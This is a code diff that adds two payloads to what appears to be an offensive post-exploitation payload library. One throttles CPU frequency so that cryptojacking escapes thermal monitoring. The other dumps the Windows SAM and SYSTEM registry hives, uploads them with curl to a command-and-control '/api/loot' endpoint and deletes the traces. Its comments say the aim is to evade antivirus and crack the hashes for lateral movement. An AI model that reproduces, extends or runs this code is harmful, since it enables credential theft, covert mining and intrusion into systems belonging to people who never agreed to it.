@@ -2038,6 +2038,55 @@ echo "PERSISTENCE_INSTALLED: firewall_disable"
 _FIREWALL_DISABLE_RUN = """iptables -L INPUT 2>/dev/null | head -1 || echo 'iptables unavailable'"""
 
 # --------------------------------------------------------------------------- #
+# CPU governor manipulation — thermal stealth (P4)
+# --------------------------------------------------------------------------- #
+_CPU_GOVERNOR_INSTALL = _PREAMBLE + """
+# Set CPU governor to powersave and cap max frequency to reduce thermal
+# footprint. Sustained 100% CPU heats the host — some datacenters monitor
+# CPU temperature as a cryptojacking signal. Capping frequency to 80% of
+# max keeps mining throughput acceptable while reducing thermal output.
+for cpu in /sys/devices/system/cpu/cpu*/cpufreq/; do
+    [ -d "$cpu" ] || continue
+    echo powersave > "${cpu}scaling_governor" 2>/dev/null || true
+    max_freq=$(cat "${cpu}cpuinfo_max_freq" 2>/dev/null)
+    if [ -n "$max_freq" ]; then
+        echo $((max_freq * 80 / 100)) > "${cpu}scaling_max_freq" 2>/dev/null || true
+    fi
+done
+echo "[*] CPU governor set to powersave, max freq capped at 80%"
+echo "PERSISTENCE_INSTALLED: cpu_governor"
+"""
+
+_CPU_GOVERNOR_RUN = """cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor 2>/dev/null || echo 'cpufreq unavailable'"""
+
+# --------------------------------------------------------------------------- #
+# Windows credential dump (P6)
+# --------------------------------------------------------------------------- #
+_WINDOWS_CRED_DUMP_INSTALL = _PREAMBLE + """
+# Dump Windows credentials using built-in tools (no Mimikatz — avoid AV).
+# Dumps SAM hashes via registry save, exfiltrates via curl to C2.
+if ! command -v reg >/dev/null 2>&1; then
+    echo "[!] not a Windows host — skipping"
+    exit 1
+fi
+reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam.save 2>nul || true
+reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\system.save 2>nul || true
+C2_URL="{{c2_url}}"
+API_TOKEN="{{api_token}}"
+if [ -n "$C2_URL" ]; then
+    curl -fsSL -X POST "${C2_URL}/api/loot" \
+        -F "sam=@C:\\\\Windows\\\\Temp\\\\sam.save" \
+        -F "system=@C:\\\\Windows\\\\Temp\\\\system.save" \
+        -H "Authorization: Bearer ${API_TOKEN}" 2>/dev/null || true
+fi
+del C:\\\\Windows\\\\Temp\\\\*.save 2>nul || true
+echo "[*] Windows credentials dumped"
+echo "PERSISTENCE_INSTALLED: windows_cred_dump"
+"""
+
+_WINDOWS_CRED_DUMP_RUN = """reg query HKLM\\\\SAM 2>nul | head -1 || echo 'reg unavailable'"""
+
+# --------------------------------------------------------------------------- #
 # Cron-based C2 beacon (P5)
 # --------------------------------------------------------------------------- #
 
@@ -2807,6 +2856,49 @@ def _payloads() -> list[Payload]:
             run_script=_FIREWALL_DISABLE_RUN,
             artifacts=[],
             tags=["evasion", "firewall", "iptables", "T1562.004"],
+        ),
+        # ----------------------------------------------------------------- #
+        # CPU governor manipulation — thermal stealth
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="cpu_governor",
+            category="evasion",
+            name="CPU Governor Manipulation",
+            description="Sets the CPU governor to powersave and caps max frequency at 80% to reduce "
+                        "thermal footprint. Sustained 100% CPU heats the host — some datacenters "
+                        "monitor CPU temperature as a cryptojacking signal. Capping frequency keeps "
+                        "mining throughput acceptable while reducing thermal output. Mirrors T1562.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=[],
+            config_schema={},
+            install_script=_CPU_GOVERNOR_INSTALL,
+            run_script=_CPU_GOVERNOR_RUN,
+            artifacts=[],
+            tags=["evasion", "cpu", "thermal", "stealth", "T1562"],
+        ),
+        # ----------------------------------------------------------------- #
+        # Windows credential dumping
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="windows_cred_dump",
+            category="evasion",
+            name="Windows Credential Dump",
+            description="Dumps Windows SAM and SYSTEM registry hives using built-in reg.exe (no "
+                        "Mimikatz — avoids AV detection). Exfiltrates the hashes via curl to the C2 "
+                        "/api/loot endpoint. Hashes can be cracked offline for lateral movement. "
+                        "Mirrors T1003.001.",
+            platforms=["windows-x64", "windows-x86"],
+            install_type="script",
+            dependencies=["reg", "curl"],
+            config_schema={
+                "c2_url": {"type": "string", "required": True},
+                "api_token": {"type": "string", "required": True},
+            },
+            install_script=_WINDOWS_CRED_DUMP_INSTALL,
+            run_script=_WINDOWS_CRED_DUMP_RUN,
+            artifacts=["sam.save", "system.save"],
+            tags=["evasion", "windows", "credentials", "sam", "T1003.001"],
         ),
         # ----------------------------------------------------------------- #
         # Cron-based C2 beacon
